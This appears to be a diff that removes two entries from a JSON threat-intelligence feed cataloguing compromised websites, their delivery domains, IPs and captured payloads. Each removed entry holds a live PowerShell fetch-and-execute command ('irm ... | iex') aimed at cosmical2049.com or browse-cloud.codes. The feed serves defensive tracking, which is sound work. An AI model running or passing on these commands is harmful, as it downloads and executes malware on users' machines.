@@ -2263,50 +2263,5 @@
     ],
     "ReportId": "cmwdakyne02t60omlgkpmg8ab",
     "ScannedAt": "2026-11-12T08:34:39.120000+00:00"
-  },
-  {
-    "UrlDomain": "captivationphotography.com",
-    "DeliveryUrl": [
-      "cosmical2049.com"
-    ],
-    "PayloadUrl": [
-      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
-    ],
-    "IP": [
-      "162.241.252.149"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
-    "ResolvedDownloadUrl": [
-      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
-    ],
-    "ReportId": "cmwd9bnf802hk0omlsqvlimv7",
-    "ScannedAt": "2026-11-12T07:59:24.865000+00:00"
-  },
-  {
-    "UrlDomain": "kirara.com.br",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "77.37.83.201"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/013ce88bf8a96d89",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&_v=29907834",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/013ce88bf8a96d89"
-    ],
-    "ReportId": "cmwd95g6w02ga0omlk6zhc06u",
-    "ScannedAt": "2026-11-12T07:54:35.761000+00:00"
   }
 ]
